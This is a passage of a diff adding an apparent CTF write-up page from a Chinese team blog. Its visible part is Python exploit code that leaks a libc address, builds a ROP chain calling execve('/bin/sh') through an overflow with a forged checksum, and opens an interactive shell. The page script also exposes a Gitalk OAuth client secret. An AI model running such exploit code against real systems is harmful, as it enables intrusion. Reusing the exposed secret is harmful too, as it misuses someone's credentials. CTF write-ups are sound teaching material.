+<span class="n">data</span><span class="p">,</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">data</span> <span class="o">-</span> <span class="n">abort_offset</span>
+<span class="k">print</span> <span class="s2">&quot;libc base: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">convert_addr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">instr</span><span class="p">):</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
+        <span class="n">a</span> <span class="o">+=</span> <span class="p">[</span><span class="n">instr</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">a</span>
+
+
+<span class="n">syscall_ret</span> <span class="o">=</span> <span class="mh">0x00000000000bc375</span> <span class="o">+</span> <span class="n">libc_base</span>
+<span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="mh">0x0000000000033544</span> <span class="o">+</span> <span class="n">libc_base</span>
+<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x0000000000021102</span> <span class="o">+</span> <span class="n">libc_base</span>
+<span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="mh">0x00000000000202e8</span> <span class="o">+</span> <span class="n">libc_base</span>
+<span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="mh">0x0000000000001b92</span> <span class="o">+</span> <span class="n">libc_base</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x18cd57</span> <span class="o">+</span> <span class="n">libc_base</span>
+<span class="n">pop7_ret</span> <span class="o">=</span> <span class="mh">0x00000000000210f9</span> <span class="o">+</span> <span class="n">libc_base</span>
+
+<span class="n">pad</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span>
+<span class="n">pad</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span>
+<span class="n">pad</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">pad</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+<span class="n">pad</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span>
+<span class="n">pad</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pad</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span>
+<span class="n">pad</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pad</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">76</span><span class="o">-</span><span class="mi">8</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">12</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop7_ret</span><span class="p">)</span>  
+<span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;</span><span class="se">\x37</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x37</span><span class="s2">&quot;</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="mh">0x200</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="o">+</span> <span class="n">convert_addr</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x32</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;F&quot;</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;W&quot;</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;9&quot;</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;9&quot;</span>
+<span class="n">checkss</span> <span class="o">=</span> <span class="n">validate_checksum</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">p16</span><span class="p">(</span><span class="n">checkss</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">p16</span><span class="p">(</span><span class="n">checkss</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;U&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;E&quot;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">pad</span><span class="p">)</span>
+<span class="c1"># p.sendline(&quot;S&quot;)</span>
+
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+                
+                  
+                
+              
+              
+                <!-- Set from config but allow override -->
+   
+
+<hr>
+
+<!-- Comments Integration -->
+ 
+<h2 id="__comments">评论</h2>
+<form id="gitalk-form" onsubmit="return false;">
+    <div id="gitalk-container"></div>
+</form>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '708ce3b6562eb67f799f',
+        clientSecret: 'fa962a493d91e7d25852c1562cf3972825e0767e',
+        repo: 'blog_comment',
+        owner: 'DF-11A',
+        admin: ['4uuu', 'DF-11A'],
+        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script> 
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../../turtles/writeup/" title="turtles | objc对象构造" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  后退
+                </span>
+                turtles | objc对象构造
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../../alien_invasion/writeup/" title="Alien Invasion | 数据越界" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  前进
+                </span>
+                Alien Invasion | 数据越界
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2016 - 2018 DF Team
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../../assets/javascripts/application.a26c1c19.js"></script>
+      
+        
+        
+          
+          <script src="../../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../../../../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../../../../assets/javascripts/lunr/lunr.jp.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      
+        <script src="../../../../_static/js/extra.js"></script>
+      
+        <script src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+        <script src="../../../../search/main.js"></script>
+      
+    
+    
+      
+    
+  </body>
+</html>
